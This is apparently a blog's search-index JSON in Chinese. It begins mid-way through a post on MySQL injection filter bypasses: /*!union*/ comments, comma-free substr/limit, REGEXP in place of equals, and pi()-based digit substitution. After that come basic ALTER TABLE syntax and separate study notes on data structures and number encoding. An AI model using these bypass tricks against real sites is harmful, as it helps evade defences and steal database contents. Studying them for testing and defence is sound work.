也可以通过 char 或 concat与chr组合 来合成字符串,或使用进制转换函数表示成其他进制例: SELECT * FROM users WHERE username = 0x44756d62 逗号被过滤 substr 与 limit 12substr(data FROM 1 for 1) # substr(data, 1, 1)limit 9 offset 4 # limit 9,4 使用 join 注入 1SELECT * FROM ((SELECT id FROM user)a join (SELECT name FROM user)b join (SELECT password FROM user)c)` 等价于 `SELECT id,name,password FROM user 等号或 like 被过滤 使用 正则表达式REGEXP 或 in != 和 &lt;&gt; 都是不等于 if 被过滤 case when condition then 1 else 0 end union被过滤 使用/*!union*/可以绕过对union的过滤 数字被过滤 代替字符 对应的数 对应的字符 false 0 无 !pi() 0 无 true 1 无 !!pi() 1 无 true+true 2 无 floor(pi()) 3 无 ceil(pi()) 4 无 floor(version()) 5 无 ceil(version()) 6 无 ceil(pi()+pi()) 7 无 floor(version()+pi()) 8 无 floor(pi()*pi()) 9 无 ceil(pi()*pi()) 10 A ceil(pi()*pi())+true 11 B ceil(pi()+pi()+version()) 12 C floor(pi()*pi()+pi()) 13 D ceil(pi()*pi()+pi()) 14 E ceil(pi()*pi()+version()) 15 F floor(pi()*version()) 16 G ceil(pi()*version()) 17 H ceil(pi()*version())+true 18 I floor((pi()+pi())*pi()) 19 J ceil((pi()+pi())*pi()) 20 K ceil(ceil(pi())*version()) 21 L ceil(pi()*ceil(pi()+pi())) 22 M ceil((pi()+ceil(pi()))*pi()) 23 N ceil(pi())*ceil(version()) 24 O floor(pi()*(version()+pi())) 25 P floor(version()*version()) 26 Q ceil(version()*version()) 27 R ceil(pi()*pi()*pi()-pi()) 28 S floor(pi()*pi()*floor(pi())) 29 T HANDLER 语句代替SELECT查询语法如下: 12345678910HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE 附录 Mysql的基本操作 Sqlmap的使用 SQL fuzz 字典 Mysql的基本操作 修改表名12alter table test_a rename to sys_app;retable table test_a to sys_app; 修改表注释1alter table sys_application comment '系统信息表'; 修改字段类型和注释1alter table sys_application modify column app_name varchar(20) COMMENT '应用的名称'; 修改字段类型1alter table sys_application modify column app_name text; 设置字段允许为空1alter table sys_application modify column description varchar(255) null COMMENT '应用描述'; 增加一个字段，设好数据类型，且不为空，添加注释1alert table sys_application add `url` varchar(255) not null comment '应用访问地址'; 增加主键 1alter table t_app add aid int(5) not null ,add primary key (aid); 增加自增主键 1alter table t_app add aid int(5) not null auto_increment ,add primary key (aid); 修改为自增主键1alter table t_app modify column aid int(5) auto_increment ; 修改字段名字(要重新指定该字段的类型)1alter table t_app change name app_name varchar(20) not null; 删除字段 1alter table t_app drop aid; 在某个字段后增加字段1alter table `t_app` add column gateway_id int not null default 0 AFTER `aid`； #(在哪个字段后面添加) 调整字段顺序 1alter table t_app change gateway_id gateway_id int not null after aid ; #(注意gateway_id出现了2次) Sqlmap的使用sqlmap用法 SQL fuzz 字典sql_fuzz)dict 欢迎大家在评论区补充未提到的方法 参考 对MYSQL注入相关内容及部分Trick的归类小结","link":"/2021/05/16/SQL_Inject/"},{"title":"数据结构——基础知识","text":"基本概念 数据信息的载体 数据元素数据的基本单位,由若干个数据组成 数据对象相同性质的数据元素集合 数据类型值的集合和对集合的操作 1.原子类型: 不可再分 2.结构类型: 值可以再分解成若干数据类型 3.抽象数据类型: 组织与之相关的操作(可以用来定义一个完整的数据结构) 数据结构 相互之间存在一种多多种特定关系的数据元素集合 数据结构独立于其存储结构 逻辑结构- 线性结构 一般线性表 受限线性表: 栈、队列、串 - 线性表推广 线性表推广: 数组 非线性结构 集合 树: 一般树、二叉树 图: 有向图、无向图 存储结构 顺序存储 逻辑上相邻的元素物理位置也相邻 优点 ① 随机存取;② 每个元素占用最少的存储空间 缺点 只能使用相邻的存储单元, 可能产生较多的外部碎片 链式存储 逻辑上相邻的元素物理位置上不一定相邻, 使用元素存储地址指针表示逻辑关系 优点 不会出现碎片现象, 能充分利用所有存储单元 缺点 ① 存储会占用额外的存储空间; ② 只能顺序存储 索引存储 在存储元素信息和索引表(索引表每项称为索引项) 优点 检索速度快 缺点 ① 索引表占用额外存储空间; ② 增删数据时,需要花费额外时间修改索引表 散列存储(哈希存储) 根据元素关键字直接计算出元素的存储地址 优点 检索、增加、删除结点的操作快 缺点 对散列函数要求高， 若散列函数有缺点，会出现元素存储单元冲突，为解决冲突而增加时间和空间开销的问题 时间/空间复杂度 常见的时间复杂度$O(1) &lt; O(\\log_2n) &lt; O(n\\log_2n) &lt; O(n^2) &lt; O(n^3) &lt; O(2^n) &lt; O(n!) &lt; O(n^n)$ 齐次线性递推关系 $$T(n) = \\begin{cases}1, n=1,2\\aT(n-1) + bT(n-2)\\\\end{cases}$$ 主要计算$$T(n) = T(n-1) + T(n-2)\\quad ①$$ $①式$为二阶线性常系数齐次差分方程$$X_{k+2} = AX_{K+1}+bX_K \\quad ②$$其中$a^2+4b\\not=0$如果等比数列 $\\lambda^k$ 是$②式$的解,则有$$\\lambda^2-a\\lambda-b=0\\quad ③$$解$③式$得$\\lambda_1,\\lambda_2$, 且$X_k=C_1\\lambda_1^k+C_2\\lambda_2^k \\quad ④$可将特解(如$k=1,2$)带入$④式$中得到$C_1,C_2$ 主定理主定理适用于如下表达式$$f(n)=af(\\frac{n}{b}) + g(n)$$计算主定理类型的时间复杂度的方法为:$n^{\\log_ba}$ 与 $g(n)$ 比阶, 则$$T(n)=\\begin{cases}n^{\\log_ba} \\ \\ \\quad\\quad \\quad n^{\\log_ba} &gt; g(n)\\\\g(n) \\quad \\quad \\quad \\quad n^{\\log_ba} &lt; g(n)\\\\n^{\\log_ba}\\log_2n \\quad n^{\\log_ba} = g(n)\\\\\\end{cases}$$","link":"/2021/06/16/DataStructure_1/"},{"title":"一 \t计算机组成原理-基础知识","text":"硬件的发展 第一代: 电子管时代 第二代: 晶体管时代 第三代: 中小规模集成电路时代 第四代: 大规模,超大规模集成电路时代 数据大小 比特:bit,也叫一位,也可以叫b 字节:byte,等于8bit 1B=8bit 字:word,一般等于16bit,两个字节(由机器的硬件决定) 双字:dword,等于32bit,4个字节 冯诺依曼机 首次提出 存储程序 概念 特点 计算机由五大部件组成 指令和数据以同等地位存储在存储器中(可按地址寻访) 指令和数据用二进制表示 指令由操作码和地址码组成 存储程序 以运算器为中心(导致数据处理变慢) 现代计算机以存储器为中心 基本硬件 输入设备: 将信息转换成机器能识别的形式 输出设备: 将结果转换成人们收悉的形式 主存储器: 存放数据和程序 存储体: 存放数据 存储单元: 每个存储单元存放一串二进制码 存储字: 存储单元中二进制代码的组合 存储字长: 存储单元中二进制代码的位数 存储元: 存储一个二进制位(1bit) MAR(地址寄存器): 存储数据地址 MAR位数反应存储单元的个数 如MAR有4位,则对应16个存储单元(可以表示6个地址) MDR(数据寄存器): 存储由MAR获得的数据 MDR位数等于存储字长 如MDR有16位,则可以存放一个字(word)(16bit)的信息 运算器: 算术运算 逻辑运算 ACC: 累加器 MQ: 乘商寄存器 x: 通用的操作数寄存器 ALU: 算术逻辑单元 控制器: 指挥各部件 CU: 控制单元, 给出控制信号 IR: 指令寄存器,存放当前执行的指令 PC: 程序计数器,存放下一条指令地址(取址后自动加1) 常见表示方法 寄存器名: 表示地址 (寄存器名): 表示寄存器的值 M: 表示存储器 性能指标存储器的容量计算 设MAR的位数位为$a$MDR的位数为$b$则 $存储器的总容量=2^a*b(bit)$ CPU 时钟周期: 单位 微妙 纳秒 $CPU主频=\\frac{1}{CPU}$的时钟周期,单位赫兹(Hz) CPI: 指令执行所需的时钟周期数量 IPS: $每秒执行多少调指令=\\frac{主频}{平均CPI}$ FLOPS: 每秒钟可以执行多少次浮点运算 系统整体 数据通路带宽数据总线一次冰雪传送信息的位数 吞吐量: 系统在单位时间内处理请求的数量 响应时间: 指用户向计算机发送一个请求,到系统对该请求做出响应所需要的等待时间 数据的存储方式和排列 大端模式(最高有效字节MSB)(便于人阅读)最高有效字节存放在低地址,最低有效字节存放在高地址部分 小端模式(最低有效字节LSB)(便于机器使用)最高有效字节存放在高地址, 最低有效字节存放在低地址部分 边界对齐计算机每次访存只能读/写1个字,边界对齐牺牲部分空间,来提高访存效率(如果一个变量的存放位置在两个字直接,就要访存2次才能读取完,采用边界对齐的方式,可以减少这样的情况发生)","link":"/2021/06/19/COP-1/"},{"title":"二   计算机组成原理-数据的表示与运算","text":"数据的表示及运算进制 基数每个数码位所用的不同符号的个数,r 进制的基数为 r 转换 整数部分 小数部分 BCD 码4bit表示一个十进制的字符 分类8421 码 属于有权码, $4$ 个比特对应 8421如$0001_2=1_{10}$, $1000_2=8_{10}$ , $1001_2=9_{10}$ 加法运算 方法 1转换成 $10$ 进制数后相加,得到的结果在转换为 BCD 码 方法 2:二进制相加,得到的结果如果大于 $10_{10}(1010_{2}-1111_{2})$ ,则结果加 $6$ 修正,高位没 4 位则在左边补 0如 $0101_{2}+1000_{2}=1101_{2}=13_{10}$,结果大于 $10_{10}(1010_{2}-1111_{2})$,结果加 $6$, 即$1101_{2}+0110_{2}=10011_2$, 结果小于 8 位,补三个 0 得到 0001,0011 每四位转换成$10$进制 ($0001_2=1_{10}$, $0011_2=3_{10}$) 结果为 $13$ 余三码在 8421 码的基础上每个数加上($0011_2$) 如:用余三码表示$1_{10}$, 8421码对应的$1_{10}$为$0001_2$,加上$0011_2$,结果为$0100_2$ 属于无权码(对应的每个2进制位没有对应的10进制) 2421 码 4个二进制位分别对应2421 所表示十进制数0-4 的二进制首位位 0所表示十进制数5-9 的二进制首位位 1 属于有权码, $4$ 个比特对应 2421 字符与字符串 ASCII 码 汉字 区位码 国标码 机内码 校验码(重要)基础概念 码字 由若干位代码组成的一个字 码字间的距离 两个码字逐位对比,具有不同位的个数 码距 各合法码字间的最小距离 $码距=1$ 时,无检错能力 $码距=2$ 时,有检错能力 $码距 \\geq 3$ 时,可以有检错和纠错能力(如海明码) 奇偶校验码 奇校验码: 整个校验码(有效信息位和校验位)中 1 的 个数为奇数 偶校验码: 整个校验码(有效信息位和校验位)中 1 的 个数为偶数 如果接收到的数据中,1的个数不为奇数(偶数),则可以判断出错. 如果出现偶数个错误,则奇偶校验码检验不出错误 偶校验的实现 各信息进行异或,得到的数字添加在最高位 偶校验的检验 对收到的信息每个为进行异或,得到的结果为0,则可能没错(可能有2位出错), 若为1则一定出错 海明码 基于偶校验的扩展,拥有多个校验位,能够自动检测出 1 位出错,并纠错但是对于 2 位以上的出错只能检验出错误(使用全校验码的前提下) 海明码校验位的位置 信息位有 $n$ 位, 校验位有 $k$ 位, 共 $n+k$ 位,对应 $2^k$ 种状态($2^k \\geq n+k+1$) 每个校验位放在 $2^{i-1}$ 上(如 P1,P2,P3),然后将信息位依次从低到高进行填充(如 $D_1,D_2,D_3,D_4$) 校验位的计算 校验位 P1 将数据中第 `1` 位为 `1` 的数据划为一组,并计算该组中信息的奇偶校验码 校验位 P2 将数据中第 2 位位 1 的数据划为一组,并计算该组的奇偶校验码…以此类推 纠错(仅限 1bit 出错)$S_1=P_1$ 异或属于 $P_1$ 分组的数据$S_2=P_2$ 异或属于 $P_2$ 分组的数据$S_3=P_3$ 异或属于 $P_3$ 分组的数据如果 $S_1$ $S_2$ $S_3$ 都为 0 则没有出错如果不为 0则 $S_3, S_2, S_1$ 组成的二进制数所指的位数出错如 $S_1=0, S2 =1, S3=0$, 则 $010_2=2_{10}$,第二位出错 全校验码通常会在头部在加一个校验位,计算所有校验位的偶校验码 CRC码(循环冗余校验码) 原理双方约定一个除数,$K个信息位+R个校验位$作为被除数,添加校验位后需保证除法的余数为 $0$ $$生成多项式=除数\\\\ 校验位的长度 R=生成多项式的最高次幂\\\\ CRC 码位数=K+R=N=信息码\\\\ 若满足: 2^R \\geq K+R+1 则可以检验并纠正 1 个 bit 错误$$ 计算 校验位R 信息码左移 R 位,地位补 0(右边添加 R 个 0) 用生成多项式进行模 2 除法,产生余数(R 位) 检验方使用信息吗除以约定好的除数,结果为 0 则没有出错;若不为 0,则得到的结果出错 模2除: 被除数的最高位为 1,则商 1,然后减除数;除数的最高位为 0,则商 0 然后减 0; 其余位进行模 2 减 模 2 减相当于异或操作","link":"/2021/06/20/COP-2/"},{"title":"三   计算机组成原理-数的编码与运算","text":"无符号数 全部二进制位均表示数值位, 没有符号位 会求表示范围 无符号数无小数部分 设字长 $n$ 位,则表示范围位 $0至2^n-1$ 有符号数的编码原码 原码表示数 用尾数表示真值的绝对值, 符号位0,1对应正,负 符号位都在最高位 小数点左边的为整数部分,右边为小数部分 定点小数 小数点在最前方(隐含) 设字长位 $n+1$ 位,则 $表示范围=-(1-2^{-n}) \\leq x \\leq 1-2^{-n}$ 有 +0 与-0 的区分 定点整数 小数点在最后方(隐含)设机器字长为 $n+1$ 位,则 $表示范围=-(2^n - 1)\\leq x\\leq 2^n - 1$ 注意: 0有+0和-0 运算 移位 符号位保持不变,数值位才移位 右移: 高位补0, 低位舍弃,若 $舍弃的位=0$ ,相当于除 $2$ ,若舍弃的位不为 $0$ ,则会丢失精度 左移: 低位补0, 高位舍弃,若 $舍弃的位=0$ ,相当于乘 $2$ ,若舍弃的位不为 $0$,则会丢失精度 乘法$[x]_原 * [y]_原$ 符号位不参与运算, 符号位单独运算: $符号位=x的符号位 \\bigoplus y的符号位$ 进行 y 轮加法,加完一轮后,逻辑右移(符号位也参与移动),高位补 0,,当前计算结果的最低为,往右移到 MQ 的最高位,辅助位初始为 0,每次右移 MQ 的最低为变为辅助位 MQ 中最低为=1 时,加$|x|_原$MQ 中最低为=0 时,加 0 除法$[x]_原 \\div [y]_原$在定点小数的除法中,被除数要小于除数 恢复余数法(手算) 符号位单独运算: $符号位=x的符号位 \\bigoplus y的符号位$ 一共 $n = 机器字长-符号位长$ 次运算, 每次加除数的绝对值的负数的补码,如果结果为负数,则将本次的商改为 0,并且将余数恢复为减法之前(加回除数) 每一次操作后,进行一次逻辑左移,低位补 0 (最后一次上商余数补左移)(一共左移 n 次,上商 n+1 次) 加减交替法(不恢复余数法) 符号位也参与运算 一共 $n = 机器字长-符号位长$ 次运算, 余数为负, 则余数左移 1 位后加$|除数|$余数为正, 则余数左移一位后减去$|除数|$ 最后一步, 若余数为负,则商 0,并加上$|除数|$得到正确的余数 余数的正负性与商相同 反码 反码表示数 若符号位为0, 则反码与原码相同 若符号位为1, 则反码是原码的数值为全部取反 定点整数与定点小数的表示范围相同 运算 移位 正数与原码操作相同 操作负数时:右移: 高位补1,低位舍弃左移: 低位补1, 高位舍弃 补码 补码表示数 若符号位为0, 则补码与原码相同 若符号位为1, 则 $补码=反码+1$(要考虑进位) 负数补码的巧妙方法(0 不能用这种方法)看原码,从右往左找到1(不包括符号位),这个1的左边(不包括这个 1 和符号位)的数取反,其余的不变如10101010100的补码为11010101100补码转原码:看原码,从右往左找到1(不包括符号位),这个1的左边(不包括这个 1 和符号位)的数取反,其余的不变如11010101100的原码为10101010100 定点整数范围: $-2^n\\leq x\\leq 2^{n-1}$ 定点小数范围: $-1\\leq x\\leq 1-2^{-n}$ 作用: 将减法操作转变为加法操作 运算 移位 正数与原码操作相同 负数最右边的1及其右边的数同原码操作最右边的1其左边的数同反码操作 在补码的加减运算中, 符号位也参与运算 [A+B]补 = [A]补 + [B]补 加减及溢出判断只有正数相加才会有上溢, 只有负数相加才会有下溢 方法 1:设$[A+B]_补=[S]_补$A 的符号位为 aB 的符号位为 bS 的符号位为 s$V = a\\bar{b}\\bar{s}+\\bar{a}\\bar{b}s$若 $V=1$,表示有溢出若 $V=0$,表示无溢出 方法 2:采用符号位的进位 C 和最高数值位 S若 $C=0,S=1$,则出现上溢若 $C=1,S=0$,则出现下溢 方法 3(双符号位补码)(模 4 补码)(运算时会复制一个符号位)采用双符号位,若两个符号位的数值不一致,则有溢出 - 例如: $A=00001111_2 B=11101000_2$在进行加法运算时$A=000001111_2 B=111101000_2$相加后 $C=111110111_2$ ,两个符号位一致,则结果无溢出, $C=11110111_2$ 乘法$[x]_补*[y]_补$ (一定使用双符号位) - 进行 y 轮加法,做完一轮加法时,算数右移(符号位不动)及高位补符号位,最后在进行一次加法,当前计算结果的最低为,往右移到 MQ 的最高位,辅助位初始为 0,每次右移 MQ 的最低为变为辅助位 - 辅助位-MQ 最低为=1,加[x]补辅助位-MQ 最低为=0,加 0辅助位-MQ 最低为=-1,加[-x]补符号位参与运算 移码 移码表示数 补码的基础上将符号位取反,只能表示整数 方便比较大小 表示范围与补码的表示范围一致 运算 移位 左移右移都是补 0 操作符号扩展(数据位数增长)- 定点整数 - 正数高位都补0, 负数原码补0, 反码补码补1 - 定点小数 - 正数地位都补0, 负数反码补1, 原码补码补0 强制转换C 语言中整型都是用补码表示 长度相同的有符号数转换成无符号数,符号位不变,将符号位添加位权(即符号位变成一个数) 长整型变短整型, 高位被截断, 只保留低位 短整型变长整型, 相当于做符号扩展","link":"/2021/06/22/COP-3/"}],"tags":[{"name":"WEB","slug":"WEB","link":"/tags/WEB/"},{"name":"Windows","slug":"Windows","link":"/tags/Windows/"},{"name":"PE","slug":"PE","link":"/tags/PE/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"LKM","slug":"LKM","link":"/tags/LKM/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"C","slug":"C","link":"/tags/C/"},{"name":"Kivy","slug":"Kivy","link":"/tags/Kivy/"},{"name":"App","slug":"App","link":"/tags/App/"},{"name":"SQL","slug":"SQL","link":"/tags/SQL/"},{"name":"ClientIP","slug":"ClientIP","link":"/tags/ClientIP/"},{"name":"InformationLeakage","slug":"InformationLeakage","link":"/tags/InformationLeakage/"},{"name":"DataStructure","slug":"DataStructure","link":"/tags/DataStructure/"},{"name":"Computer Organization Principles","slug":"Computer-Organization-Principles","link":"/tags/Computer-Organization-Principles/"}],"categories":[{"name":"Firewall","slug":"Firewall","link":"/categories/Firewall/"},{"name":"Application","slug":"Application","link":"/categories/Application/"},{"name":"Note","slug":"Note","link":"/categories/Note/"},{"name":"PE","slug":"Note/PE","link":"/categories/Note/PE/"},{"name":"WEB","slug":"Note/WEB","link":"/categories/Note/WEB/"},{"name":"Kivy","slug":"Application/Kivy","link":"/categories/Application/Kivy/"},{"name":"SQL","slug":"Note/SQL","link":"/categories/Note/SQL/"},{"name":"DataStructure","slug":"Note/DataStructure","link":"/categories/Note/DataStructure/"},{"name":"Computer Organization Principles","slug":"Note/Computer-Organization-Principles","link":"/categories/Note/Computer-Organization-Principles/"}]}